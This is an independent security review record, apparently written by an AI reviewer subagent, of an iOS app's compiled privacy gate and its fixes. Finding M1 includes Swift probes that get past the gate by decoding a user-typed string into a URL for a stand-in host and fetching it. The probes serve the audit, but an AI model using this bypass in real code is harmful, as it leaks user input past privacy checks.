---
record_type: review
id: backlog-gates-review-round-2
status: ratified
seat: independent
process_version: v6.6
date: 2026-10-14
---
# Independent review, round 2: the gates and licences wave (#253, #247, #246, #244, #261, D-197)

**Reviewer:** Code-Reviewer subagent (fresh eyes; did not author any commit in the range)
**Independent:** yes
**Date:** 2026-10-14
**Commit range:** `2891f15..82f08b0` (13 commits). Round 2 reads the fixes `4fcd037` (red) and `82f08b0`
(fix) against round 1 (`docs/reviews/backlog-gates-review-round-1.md`), then the whole range once more.
**Risk tier:** HIGH for #244 and #246 (the compiled privacy gate, INV-62, INV-64, INV-67); MEDIUM for
the rest

## Verdict
MAJOR

Round 1's M1 is fixed. Every M1 probe is now refused by the compiled gate, on the shipping client and on
the fixture, in all four configurations. N1 to N5 hold as their dispositions say. `make check-fast` passes
in the seat (117 s).

Round 1's M2 is fixed for the forms it named: a parse strategy, a URL initialiser and a decode of a type
that names `URL` are all refused. But one sentence of the fix still claims more than the gate holds:
- **M1.** "A store makes no URL by an initialiser or a decode" (INV-62, INV-67, the process log, the M2
  disposition). A decode through a generic helper in the store's own file passes the compiled gate in all
  four configurations. One spelling of it passes the text pins too. The store's own `isFileURL` guard is
  what stops it at run time.

Two minor findings (N1, N2). The wave can close once M1's claim is narrowed or the gate holds it, and N1
and N2 are fixed or filed.

How the review was done:
- **Reading.** Round 1's record and dispositions, the two fix commits, the gate's store, engine-client,
  URL and capability rules, G-11, G-13, G-14, INV-62, INV-64, INV-67, INV-78, D-197, the PRD rows
  REQ-RTR-004, REQ-RTR-005 and REQ-GAP-001, the process log entry, and the five issues.
- **Plants.** I exported `HEAD` to two scratch trees outside the seat (`git archive`). Each probe was
  appended to a scratch copy. The gate's own `dump_ast`, `references`, `problems`, `unseen_permissions`
  and `release_problems` ran on it in the four configurations (`CONFIGURATIONS`), against the shipping
  client or against the fixture folder. Each file was then restored, and a byte compare against the
  seat's file passed every time. The seat's tree is unchanged (`git diff --quiet HEAD`).
- **Mutants.** Five one-line mutants of the gate and of A1, in a scratch tree, each restored and
  byte-compared.
- **Network.** One read of `arcprize/ARC-AGI-2`'s LICENSE at the pinned commit, through `gh api`. No
  test reached the network.
- **Held-out discipline.** I read no held-out file.

## Round 1's dispositions, re-measured

| Round 1 | Holds? | Measured |
|---|---|---|
| M1 | Yes | Shipping client, four configurations, 1 new refusal each: `init(asking:)` in `EngineClient.swift`, called from `ContentView.swift` (`EngineClient.init(asking:`); a `baseURLSender` closure property, called from the screen (`EngineClient.baseURLSender`). `FrontDoor.swift` loading `EngineClient().baseURL`: 2 refusals each (`EngineClient.baseURL`, `EngineClient.init(`; the file's list is empty). Fixture: both twins are planted and expected (`FIXTURE_REFUSALS`, `scripts/client_decl_gate.py:466-467`); the `baseURL` load planted in the fixture's `FrontDoor.swift` gave the same 2 new refusals in each configuration. Mutant: matching by prefix again fails `test_a_file_reaches_only_the_engine_clients_listed_members` (`tests/unit/test_client_decl_gate.py:925`). Each per-file list equals what the shipping client reaches, in all four configurations. |
| M2 | In part | Shipping client, four configurations: the parse strategy is refused (`Foundation.ParseStrategy.parse` and `URL.ParseStrategy.init(scheme:...`), and so are a direct decode of `[URL].self`, a `Decodable` struct with a `URL` field declared and decoded in the store, and a store built on that decoded URL (each as `URL.decoded`). A generic decode helper in the same file is not refused: M1 below. Mutants: turning off `STORE_FOUNDATION_ALLOWED` fails one test, and so does turning off `URL_MADE_BY_NAME`. |
| N1 | Yes | `Models.swift` scratch copy, clause 4(a) changed ("must" to "may"): `test_credits.py` fails alone, with a correct copy above it under `#if false`, inside `/* */`, and with a correct copy under `#if DEBUG` beside the changed one in `#else`. |
| N2 | Yes | The LICENSE at `f3283f727488ad98fe575ea6a5ac981e4a188e49` is the Apache-2.0 text, its appendix reads `Copyright 2019 ARC Prize Foundation.`, and the repository holds no NOTICE file. `arc_prize_solutions` carries that line (`src/app/workflows/board_tables.py:130-132`) and is cited beside `arc_prize` (`src/app/workflows/rank.py:139`). D-197 clause 2 says so. |
| N3 | Yes | A scratch copy of the log with `**Amended by D-150 (2026-10-14)**: nothing.` at the end of D-170's pointer line: A1 refuses it. Mutant: putting the `^` back fails the test. See N2 below for the test's history. |
| N4 | Yes | `docs/prd.md` REQ-RTR-004, REQ-RTR-005 and REQ-GAP-001 no longer cite G-15. `git grep G-15` finds only history: the closed-gap note (`docs/security-invariants.md:221-223`), the process log, a closed wave's record, and two docstrings that say why. G-14 names the `#if os(watchOS)` case. |
| N5 | Yes | `Language.swift`: each function has its own doc comment. `test_router_hints.py:828` has one `# raw:`. |
| K1 | Not re-checked | Noted on #242, as the disposition says. |
| R1 | Accepted | G-10, #243. |

## Findings

### BLOCKING
- none

### MAJOR

- **M1** `scripts/client_decl_gate.py:176` (`"URL.made"` on `STORE_FOUNDATION_ALLOWED["FrontDoor.swift"]`)
  and `:451` (`DECODES_URL`): a store may still make a URL by a decode, through a generic helper in its
  own file.
  - **Why.** `DECODES_URL` reads the type a decode is substituted with. Inside a generic helper that type is
    `T`, not `URL`. The call to the helper is recorded only as `URL.made` (`url_facts`, `:767`), and
    `URL.made` is on the store's list, since `appendingPathComponent` returns a URL too. So the URL the
    helper decodes passes as a file-system URL. Nothing records which call made it.
  - **Measured, shipping client, four configurations, 0 refusals each.** Appended to `FrontDoor.swift`:

    ```swift
    private func reviewDecode<T: Decodable>(_ type: T.Type, _ data: Data) -> T? {
        try? JSONDecoder().decode(type, from: data)
    }
    func reviewProbeGeneric(_ typed: String) -> Data? {
        guard let encoded = try? JSONEncoder().encode(["ht" + "tps://example.invalid/?q=" + typed]),
              let target = reviewDecode([URL].self, encoded)?.first else { return nil }
        return try? Data(contentsOf: target)
    }
    ```

    - The same in `StandingsStore.swift`: 0 refusals, four configurations.
    - The same in the fixture's `FrontDoor.swift`: 0 new refusals, four configurations.
    - The text pin `test_the_gap_register_code_carries_no_egress_spelling_the_pin_reads` refuses it, by
      `[URL]` and by the second `contentsOf:`.
  - **A form both gates pass.** Let the compiler infer `T` from the store's own initialiser:

    ```swift
    private func reviewDecode<T: Decodable>(_ data: Data) -> T? {
        try? JSONDecoder().decode(T.self, from: data)
    }
    func reviewProbeInferred(_ typed: String) -> GapRegister? {
        guard let encoded = try? JSONEncoder().encode("ht" + "tps://example.invalid/?q=" + typed) else { return nil }
        return GapRegisterStore(url: reviewDecode(encoded) ?? GapRegisterStore.onDevice.url).load()
    }
    ```

    The compiled gate refuses nothing in the four configurations, and all 115 tests of
    `test_router_hints.py` and `test_ios_client_contract.py` pass. What stops a fetch is `load()`'s
    `guard url.isFileURL` (`ios/ModelRanking/Engine/FrontDoor.swift:316`), held by `FrontDoorTests`. I did
    not run either probe on a device.
  - **The claims.** INV-62 and INV-67 (`docs/security-invariants.md:123`, `:128`) say "A store makes no URL
    by an initialiser or a decode". So does the process log (`docs/process-log.md:852`) and round 1's M2
    disposition ("a URL initialiser or decode stays refused in both stores"). G-13 (`:197`) says "by name",
    which is true. But its "still not held" names only a URL from another file and a cast, not a generic
    helper in the store itself.
  - **Failure scenario.** A refactor of the gap register adds a small generic load-and-decode helper, and a
    later change hands it a URL-typed result. `make client-decls` passes. The text pins hold only while
    the type or the load is spelled out.
  - **Remedy.** Either:
    - In the two stores, refuse a call whose result is a URL unless its callee is a listed file-system
      maker (`FileManager.urls(for:in:`, `FileManager.temporaryDirectory`, `URL.appendingPathComponent`,
      `URL.deletingLastPathComponent(`). That means recording `URL.made` with its callee, and taking
      `URL.made` off `STORE_FOUNDATION_ALLOWED`. Then plant the generic helper in the fixture's
      `FrontDoor.swift`. Or
    - narrow INV-62, INV-67, the process log and the disposition to "by an initialiser, or a decode whose
      type names `URL`", and add "a URL decoded through a generic helper" to G-13's "still not held".

### MINOR (the author fixes each in this wave or files it as an issue)

- **N1** `scripts/client_decl_gate.py:165` (`STORE_FOUNDATION_ALLOWED`), `:358` (`ENGINE_CLIENT_REACHABLE`)
  and `:1822` (`unseen_permissions`): the two new allowlists have no staleness check.
  - **Measured.** Today each entry is used. All 31 entries of the `FrontDoor.swift` list and every
    per-file engine-client member are referenced on the shipping client, in all four configurations.
  - **Why it matters.** `unseen_permissions` fails the gate when a permitted arithmetic, sort or sink call
    is no longer seen (the W2 review's R3). These two lists are not on it. So an entry outlives the code
    that needed it, and the next file to need it inherits it unreviewed. `URL.made` on the store's list is
    the widest such entry (M1). `SINK_FOUNDATION_ALLOWED` has the same gap from before this wave.
  - **Remedy.** Add both lists to `unseen_permissions`, per file, or file it on #242.

- **N2** `tests/unit/test_wave_check_m21_rules.py:819-825`: the red commit's N3 test was red for a reason
  the fix does not change, and the fix commit rewrote it.
  - **Measured.** `4fcd037`'s version put the stray pointer in D-1's own section, so it named D-1 itself.
    Run against the fixed A1, it still fails: the finding names D-1 twice, and the assertion asks for D-2.
    `82f08b0` moved the plant onto D-3's pointer line under D-2. The final test is sound: it fails with the
    `^` put back (mutant).
  - **Why it matters.** The red commit does not show the red-to-green the process asks for. A reader
    taking `4fcd037` as the failing test sees a test that never goes green.
  - **Remedy.** No code change. Say so in the disposition or the process log, so the pair is not cited as
    the red evidence for N3.

### PASS (what looks good)
- **Per-file, whole-match engine-client list.** It is exact on the shipping client: `ContentView.swift`
  reaches its five members, `Models.swift` reaches `maxStandingsBytes`, and no other file reaches any.
  A protocol the screen declares and has `EngineClient` conform to is refused too, by the kept-type rule.
- **The store's Foundation list.** It is exact on the shipping client in the four configurations, and
  refuses by absence: the parse strategy, `URLComponents`, a direct URL decode and a decoded struct with
  a URL field.
- **N1's pin.** It reads through `_swift` and requires one live copy. Every dead-copy shape I tried fails it.
- **The ARC-AGI-2 credit.** The notice is the line the pinned LICENSE states.
- **Records.** G-11's new text matches the code. G-13's "by name" and its "measured in the four
  configurations" are true. The PRD rows say no more than the code holds.

## Producers of the hardened invariants
- **INV-64, the request's sources.**
  - Producers: assignments to `ContentView.task` (`apply`, `select(_:)`), key paths to it, and the engine
    client's members reached from another file.
  - Citing tests: `test_the_fixtures_six_request_shapes_are_refused_and_its_own_request_is_not`,
    `test_round_two_twins_of_the_surface_are_refused`, `test_a_file_reaches_only_the_engine_clients_listed_members`
    (`tests/unit/test_client_decl_gate.py:925`), and the fixture's `init(asking:)` and `baseURLSender`.
  - Gaps: G-11 (#242).
- **INV-62 and INV-67, the stores' URLs.**
  - Producers: `FrontDoor.swift` and `StandingsStore.swift`.
  - Citing tests: `test_a_store_makes_a_url_only_from_the_file_systems_folders`,
    `test_the_stores_shipping_urls_pass`,
    `test_the_gap_registers_file_references_only_its_listed_foundation_declarations` (`:896`), and the
    fixture's `FrontDoor.swift` (`fixtureStoreLoad`, `fixtureStoreParse`).
  - Gaps: M1; G-13 (#242).
- **INV-78, how pins read Swift.**
  - Producers: every pin in `test_router_hints.py` and `test_ios_client_contract.py`, and now
    `test_credits.py`'s licence pin.
  - Citing tests: `test_a_swift_read_in_this_file_goes_through_code`,
    `test_swift_blanks_a_block_comment_and_keeps_its_lines_and_line_comments`.
  - Gaps: G-14 (an undecidable condition).

## Acceptance criteria evidence
- **#253.** Code: `scripts/check_records.py:1576-1587`. Test: `tests/unit/test_wave_check_m21_rules.py:806`.
  The mid-line pointer is refused (measured on D-170).
- **#247.** Guard: `tests/unit/test_router_hints.py:1171`. `_swift`: `tests/unit/test_ios_client_contract.py:35-43`.
  As round 1 measured. Nothing in this round changed it.
- **#246.** Fixture: `scripts/client_decl_fixtures/FrontDoor.swift` (two probes). Tests:
  `tests/unit/test_client_decl_gate.py:877`, `:896`. The generic-helper form is not held (M1).
- **#244.** Fixture: `scripts/client_decl_fixtures/EngineClient.swift`, `ContentView.swift:273-279`.
  Tests: `tests/unit/test_client_decl_gate.py:925`.
- **#261.** Engine: `src/app/workflows/board_tables.py:96-142`, held by `tests/unit/test_credits.py`.
  Texts: `ios/ModelRanking/Engine/Models.swift`, held by
  `test_the_app_carries_each_licence_text_verbatim`. Sheet: `ios/EngineTests/CreditsTests.swift:93`.

## K.8 contract drift check
- `/v1`'s credits gain one entry, `arc_prize_solutions`, additively. The phone shows any listed credit and
  needs no change.

  ```
  src/app/workflows/board_tables.py:130:    Credit("arc_prize_solutions", "ARC Prize Foundation", "ARC-AGI-2 public evaluation tasks and solutions, "
  src/app/workflows/rank.py:139:    ARC_ATTRIBUTION: ("arc_prize", "arc_prize_solutions"),
  ```
- The gate's names changed shape. `STORE_URL_MAKERS` is gone, and `ENGINE_CLIENT_REACHABLE` is now a dict:

  ```
  scripts/client_decl_gate.py:165:STORE_FOUNDATION_ALLOWED: dict[str, frozenset[str]] = {
  scripts/client_decl_gate.py:358:ENGINE_CLIENT_REACHABLE: dict[str, frozenset[str]] = {
  ```

  `git grep STORE_URL_MAKERS` finds only the test that asserts it is gone, and round 1's record.
- Verdict: OK.

## K.9 candidates spotted outside this wave's scope
- **K1** `scripts/client_decl_gate.py:881` (`SINK_FOUNDATION_ALLOWED`): it lists `URL.made` and
  `URL.init(string:` for the engine client, and the standings store inherits both. `URL_MADE_BY_NAME`
  takes the initialiser back for the stores, but `URL.made` stays (M1's helper passes in
  `StandingsStore.swift`). A per-file list for the sink files would end the sharing. Enhancement, for
  #242's scope.

## Risks queued to next M
- **R1** CI's Linux lane runs only the text pins (G-10). M1's inferred form passes them. The sign it is
  real: a store change that adds a generic decode helper passes CI.

## Dispositions, by the author

| Finding | Disposition | Where |
|---|---|---|
| M1 | Narrowed, not closed: a store makes no URL by a URL initialiser or by a decode whose type names `URL`. INV-62, INV-67 and the process log say so, and G-13's "still not held" names the generic helper and the stores' `isFileURL` guards that refuse to load what it makes (`FrontDoorTests`, `StandingsStoreTests.testAStorePointedAnywhereButAFileReadsNothing`). Recording the call that made each URL is #242's allowlist work; the remedy is noted there. Round 1's M2 disposition said "a URL initialiser or decode stays refused"; it is read as narrowed here. | `docs/security-invariants.md`, `docs/process-log.md`, #242 |
| N1 | Fixed. `unseen_permissions` reports an entry of `STORE_FOUNDATION_ALLOWED` or `ENGINE_CLIENT_REACHABLE` the shipping client no longer references, per file; red in `ad648b0`. `SINK_FOUNDATION_ALLOWED`'s same gap is noted on #242 with K1. | `scripts/client_decl_gate.py`, `tests/unit/test_client_decl_gate.py` |
| N2 | Recorded. `4fcd037`'s N3 plant named D-1 itself and stays red against the fixed A1; `82f08b0` moved it to D-2's pointer line. Cite `82f08b0`'s test, which fails with the `^` put back, as N3's evidence, not the pair. | this table |
| K1 | Noted on #242. | #242 |
| R1 | Accepted: G-10, the owner's macOS lane (#243). | none |

